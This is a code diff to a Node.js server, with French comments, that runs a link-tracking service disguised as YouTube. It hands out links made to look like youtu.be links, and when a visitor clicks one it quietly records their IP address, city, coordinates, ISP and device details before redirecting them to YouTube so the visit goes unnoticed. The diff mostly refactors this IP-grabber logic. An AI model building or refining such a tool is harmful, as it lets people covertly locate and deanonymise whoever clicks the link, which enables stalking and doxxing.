@@ -13,6 +13,22 @@ let trackedIPs = [];
 // Store URL mappings
 let urlMappings = new Map();
 
+// Middleware to get real IP - MOVED TO TOP
+app.use((req, res, next) => {
+    req.realIp = req.headers['x-forwarded-for'] || 
+                 req.connection.remoteAddress || 
+                 req.socket.remoteAddress ||
+                 req.ip;
+    next();
+});
+
+// Add CORS headers
+app.use((req, res, next) => {
+    res.header('Access-Control-Allow-Origin', '*');
+    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
+    next();
+});
+
 // Fonction pour générer un ID YouTube-like
 function generateYouTubeId() {
     const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
@@ -23,58 +39,16 @@ function generateYouTubeId() {
     return result;
 }
 
-// Route pour créer un lien court
-app.get('/api/shorten', (req, res) => {
+// Fonction pour traiter l'IP et collecter les données
+async function processIpAndCollectData(req, videoId) {
     try {
-        const originalUrl = req.query.url;
-        if (!originalUrl) {
-            return res.status(400).json({ error: 'URL required' });
+        let ip = req.realIp;
+        if (typeof ip === 'string') {
+            ip = ip.replace('::ffff:', '').split(',')[0].trim();
         }
-
-        // Extraire le video ID
-        const videoId = originalUrl.split('v=')[1];
-        if (!videoId) {
-            return res.status(400).json({ error: 'Invalid video ID' });
-        }
-
-        // Créer un ID court pour le tracking tout en gardant l'apparence YouTube
-        const trackingId = generateYouTubeId();
-        urlMappings.set(trackingId, videoId);
         
-        if (urlMappings.size > 1000) {
-            const firstKey = urlMappings.keys().next().value;
-            urlMappings.delete(firstKey);
-        }
+        console.log('\x1b[36m%s\x1b[0m', `Processing visit from IP: ${ip}`);
 
-        // Le lien ressemble à YouTube mais passe par notre serveur pour le tracking
-        const shortUrl = `${SERVER_URL}/t/${trackingId}`;
-        console.log('\x1b[32m%s\x1b[0m', `Generated tracking URL: ${shortUrl} for video: ${videoId}`);
-        
-        res.json({ 
-            shortUrl: `https://youtu.be/watch?v=${videoId}`, // Pour l'affichage
-            trackingUrl: shortUrl // URL réelle pour le tracking
-        });
-    } catch (error) {
-        console.error('\x1b[31m%s\x1b[0m', `Error generating short URL: ${error}`);
-        res.status(500).json({ error: 'Internal server error' });
-    }
-});
-
-// Nouvelle route pour le tracking qui redirige ensuite vers youtu.be
-app.get('/t/:id', async (req, res) => {
-    const videoId = urlMappings.get(req.params.id);
-    if (!videoId) {
-        return res.redirect('https://youtube.com');
-    }
-    
-    try {
-        // Get real IP and clean it
-        let ip = req.realIp.replace('::ffff:', '');
-        ip = ip.split(',')[0].trim();
-        
-        console.log('\x1b[36m%s\x1b[0m', `New visit from IP: ${ip}`);
-
-        // Parse user agent
         const agent = useragent.parse(req.headers['user-agent']);
         const deviceInfo = {
             browser: agent.family,
@@ -90,56 +64,89 @@ app.get('/t/:id', async (req, res) => {
             ip = '8.8.8.8';
         }
 
-        try {
-            const ipInfo = await axios.get(`http://ip-api.com/json/${ip}`);
+        const ipInfo = await axios.get(`http://ip-api.com/json/${ip}`);
+        
+        if (ipInfo.data.status === 'success') {
+            console.log('\x1b[32m%s\x1b[0m', `Location found: ${ipInfo.data.city}, ${ipInfo.data.country}`);
             
-            if (ipInfo.data.status === 'success') {
-                console.log('\x1b[32m%s\x1b[0m', `Location found: ${ipInfo.data.city}, ${ipInfo.data.country}`);
-                
-                trackedIPs.push({
-                    ip: ip,
-                    country: ipInfo.data.country,
-                    city: ipInfo.data.city,
-                    latitude: ipInfo.data.lat,
-                    longitude: ipInfo.data.lon,
-                    timestamp: new Date().toISOString(),
-                    deviceInfo: deviceInfo,
-                    isp: ipInfo.data.isp,
-                    org: ipInfo.data.org,
-                    as: ipInfo.data.as,
-                    timezone: ipInfo.data.timezone,
-                    videoId: videoId // Ajout de l'ID de la vidéo pour le suivi
-                });
+            trackedIPs.push({
+                ip: ip,
+                country: ipInfo.data.country,
+                city: ipInfo.data.city,
+                latitude: ipInfo.data.lat,
+                longitude: ipInfo.data.lon,
+                timestamp: new Date().toISOString(),
+                deviceInfo: deviceInfo,
+                isp: ipInfo.data.isp,
+                org: ipInfo.data.org,
+                as: ipInfo.data.as,
+                timezone: ipInfo.data.timezone,
+                videoId: videoId
+            });
 
-                if (trackedIPs.length > 100) {
-                    trackedIPs = trackedIPs.slice(-100);
-                }
+            console.log('\x1b[32m%s\x1b[0m', `IP data stored successfully. Total IPs: ${trackedIPs.length}`);
+
+            if (trackedIPs.length > 100) {
+                trackedIPs = trackedIPs.slice(-100);
             }
-        } catch (apiError) {
-            console.error('\x1b[31m%s\x1b[0m', `Error calling IP API: ${apiError.message}`);
+        }
+    } catch (error) {
+        console.error('\x1b[31m%s\x1b[0m', `Error processing IP data: ${error.message}`);
+    }
+}
+
+// Route pour créer un lien court
+app.get('/api/shorten', (req, res) => {
+    try {
+        const originalUrl = req.query.url;
+        if (!originalUrl) {
+            return res.status(400).json({ error: 'URL required' });
         }
 
-        // Redirection vers le format youtu.be
-        res.redirect(`https://youtu.be/watch?v=${videoId}`);
+        const videoId = originalUrl.split('v=')[1];
+        if (!videoId) {
+            return res.status(400).json({ error: 'Invalid video ID' });
+        }
+
+        const trackingId = generateYouTubeId();
+        urlMappings.set(trackingId, videoId);
+        
+        if (urlMappings.size > 1000) {
+            const firstKey = urlMappings.keys().next().value;
+            urlMappings.delete(firstKey);
+        }
+
+        const trackingUrl = `${SERVER_URL}/t/${trackingId}`;
+        console.log('\x1b[32m%s\x1b[0m', `Generated tracking URL: ${trackingUrl} for video: ${videoId}`);
+        
+        res.json({ 
+            shortUrl: `https://youtu.be/watch?v=${videoId}`,
+            trackingUrl: trackingUrl
+        });
     } catch (error) {
-        console.error('\x1b[31m%s\x1b[0m', `Error processing request: ${error}`);
-        res.redirect('https://youtube.com');
+        console.error('\x1b[31m%s\x1b[0m', `Error generating short URL: ${error}`);
+        res.status(500).json({ error: 'Internal server error' });
     }
 });
 
-// Add CORS headers
-app.use((req, res, next) => {
-    res.header('Access-Control-Allow-Origin', '*');
-    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
-    next();
-});
+// Route pour le tracking
+app.get('/t/:id', async (req, res) => {
+    try {
+        const videoId = urlMappings.get(req.params.id);
+        if (!videoId) {
+            console.log('\x1b[33m%s\x1b[0m', `No video found for tracking ID: ${req.params.id}`);
+            return res.redirect('https://youtube.com');
+        }
 
-// Middleware to get real IP
-app.use((req, res, next) => {
-    req.realIp = req.headers['x-forwarded-for'] || 
-                 req.connection.remoteAddress || 
-                 req.socket.remoteAddress;
-    next();
+        // Process IP and collect data
+        await processIpAndCollectData(req, videoId);
+
+        // Redirect to YouTube
+        res.redirect(`https://youtu.be/watch?v=${videoId}`);
+    } catch (error) {
+        console.error('\x1b[31m%s\x1b[0m', `Error in tracking route: ${error}`);
+        res.redirect('https://youtube.com');
+    }
 });
 
 // Watch route that mimics YouTube
